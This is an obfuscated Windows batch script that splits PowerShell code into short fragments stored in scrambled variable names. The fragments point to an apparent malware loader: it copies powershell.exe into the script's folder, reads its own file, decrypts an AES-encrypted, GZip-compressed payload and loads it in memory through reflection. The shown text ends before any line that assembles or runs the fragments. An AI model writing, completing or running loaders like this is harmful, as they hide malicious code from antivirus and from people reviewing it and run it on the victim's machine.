@echo off
set "rMTEOpCUFw=y "
set "cGTzNrUeOK=ws"
set "AaXjHXTTYa=rS"
set "FjRUcFeGDl=xe"
set "AmUYIuqVJU=ll"
set "MdzNRpSjNg=ll"
set "NHYCjtYDDl=py"
set "piZYNlqtol=do"
set "SjxHXsxrBq=:\"
set "eXKTsFikIU= C"
set "ZfkysKBsQV= /"
set "qfmPSzHfEP=st"
set "VbNpAANtHl=em"
set "iePSAGxalf=32"
set "ZEpddEIbkz=he"
set "xCmaiDkrEQ=ow"
set "OafHljWGKV=rs"
set "fBYXHvLdzq=Po"
set "NNjzjfDPqK=\v"
set "DMsMskdPKn=in"
set "gPHQwacrfM=nd"
set "CHqXPSEhUo=we"
set "WGbnjlSXBn=s\"
set "bDgIAQumuJ=\W"
set "lQflOcCGkW=Sy"
set "CSfybDGpPb=1."
set "HXjdnCQCQc=po"
set "YMlyrGNVUa=co"
set "hKbuyGRBSd=.e"
set "pZbahOjbrs=he"
set "cTfMsftrfx=Wi"
set "ktKGPIhvXf=we"
set "JDQCOofZAm=0\"
set "SfmHNYOsXe= %~dp0"
set "kydmfvZmqj=cd"
set "RJmnqdxoZm=g = "
set "UqOGbAhAbQ=vj0m"
set "kkkcQSWOiR=736u"
set "fCBbxLFsDz=New-"
set "jJeIzzRPdt=6] -"
set "ccyptOOegZ=Comp"
set "vkZhEpKVeN=gMod"
set "uMkOEIDJxr=[Sys"
set "nLhiNZsBKO=ach "
set "djDsPbfDzy=[Env"
set "sKcoyDzLiy=$fIQ"
set "ZatvBNkeUb=oin "
set "WCULWPOSsT=m(, "
set "rOSGjddBHa=Conv"
set "bjKpwAuLBh=Secu"
set "xvJpzNifqt= [st"
set "KiwfhxtkPp=[Sys"
set "cTxrCUcGCM=oint"
set "sPUZWodUTO=Disp"
set "PJcsXoMjhA=V = "
set "TAhHaCRAVc=-1.."
set "ZMaRcfvYBG=SX ="
set "jyFOevYYJl=);$Q"
set "tlCqrqEMln=zZ.T"
set "gFmvcIsWBW=$fIQ"
set "AUeKXEtfOt=SX);"
set "ziMOsmdXHD=pose"
set "NgTFoCxgKF=$SXx"
set "duAGkObnQw=join"
set "upaNmnlfad=le  "
set "UimQHQcvOC=OyzA"
set "PgAlipQPSp=af.I"
set "AMnJnnPjGj=:('g"
set "wTTVStwvAU=bjec"
set "TtmSWuEPmn=bstr"
set "zwHtJWczKX=.Cry"
set "fuJTQcQcpc=ke($"
set "UaDWKuUuyU=tion"
set "zjcfMYzBmF=saBm"
set "olvcgJpZuh=rtS4"
set "exUciwwfVn=ose("
set "TJfGuhMAJp=UpQ "
set "IHmonnXKTB=] -j"
set "WIcSmtdgIY=1..-"
set "WkjKajamBk=);$S"
set "nynLdWvwNa=.Dis"
set "AmckCdsePU=16] "
set "mtxplpIvST=brea"
set "uLZNIvfRFj=ck($"
set "XKuhnRJfnx=Fina"
set "nNpFbxbJPH=pStr"
set "MvnAIhBeJq=esaB"
set "tlNOLEOfNV=('da"
set "KxslIKwBue=nuUk"
set "rFowDOhoBB=ptog"
set "QGxHXDOUsG=QOaN"
set "SWhZpbTEbA=trea"
set "DpHFkaQqrR= if "
set "XQoteiamGz=Q.En"
set "IPVdICPtFR=$QOa"
set "JWahDGYeNZ=Secu"
set "QxnPKSWzUW=.-16"
set "SWJpSjHPGm=();$"
set "PWsKCVtTtN=Xxaf"
set "jbcmPEjGDM=[]] "
set "LRzdSmeZgb=OwBb"
set "XIUnjSfaVh=[IO."
set "ILpSGtQEeL=BC;$"
set "TJPbZElcsJ=7;$S"
set "mqINgIbUHR=ispo"
set "YAfZkoVuag=hy.A"
set "eyPKizwWBR=yste"
set "FMSDJXqWQT=Comp"
set "ImmAxiwTXX=-joi"
set "HuvNTLrsRV=ypto"
set "IKBLJkVqUE=null"
set "FocdZiEKWY==');"
set "BVoxjKONYE=gnir"
set "wFUIyaEiQD='gni"
set "cYTgVphaIf=m.IO"
set "AHIPWetofD=iV, "
set "hSYgwXzCvA=lcB."
set "xMyeNcgfLn=.Mod"
set "kVUevpmUZX=slcB"
set "LOptmzVoKx=Bb);"
set "AVLNLOtyor=Disp"
set "xFOUjesXRk=Invo"
set "vmhYMZmkZg=)) {"
set "QoZjgiMsDu=ert]"
set "TRBctDzBId=rity"
set "QEeTIykToS=rt]:"
set "QipypbeNPB=pose"
set "COIXINgDYt=('%~f0'"
set "fuwenNEsKp=oryS"
set "GWzyXgBZTy=ose("
set "BIrApMzKhi=PKCS"
set "AeLTPhmByx= New"
set "SVVKhshiXa=ziV."
set "DhjJqlEUlU=ewLi"
set "NfESmgvsxb=e]::"
set "UHolHtZFBh=rofi"
set "uMXwxqFnXe=flec"
set "KlgAoSqvTT=0O+g"
set "KiFIQcChfq=F'[-"
set "WLSdEgmGLC=ay()"
set "DwFrtAUMUR=-joi"
set "gtdUcBZDsP=ne);"
set "dtRgiRaxXA=orF'"
set "WxQaLfINOb=..-1"
set "FywauCTOxd=tsWi"
set "sfbbeVenWP=th('"
set "WlxEckbUsd=ptog"
set "JteNOmvdTf=hxo "
set "ekWjyVaBav=morF"
set "kCbTfodolj=lit("
set "lsItZSZwwl=comm"
set "mUKvlUuOWW=Bb ="
set "HGvGfyeYZY===')"
set "fDTGoWyvAp=$fIQ"
set "PwkPQJmKCr=Obje"
set "tjpHyJxrKR=O.Me"
set "PcxakegWyM=.GZi"
set "gxmsRNdckY=ring"
set "KioIlVeqLY= [Sy"
set "UpDXkVgadO=;$Mr"
set "LzQXYkMOsW=);$f"
set "MsCfTvargE=.Com"
set "PzEKLdWGjT=Xxaf"
set "orLgPkHjRZ=fore"
set "sVLjNzNRUJ=tem."
set "eMHJRjIVso=ss -"
set "ySkFYSTEGZ=o.Su"
set "GDLxrnGmIx=m.Re"
set "PZTMMNDOml=oArr"
set "BjAUuJPABD=  $J"
set "HFUJwkGxag=and "
set "bbTvKIGBUr=.Dis"
set "EvcmGvlVgd=in $"
set "zGuiHOpGCe=[Sys"
set "EUbyqExeYT=bOwB"
set "VraWLNRwia=Xxaf"
set "RrukogiXAC=Xxaf"
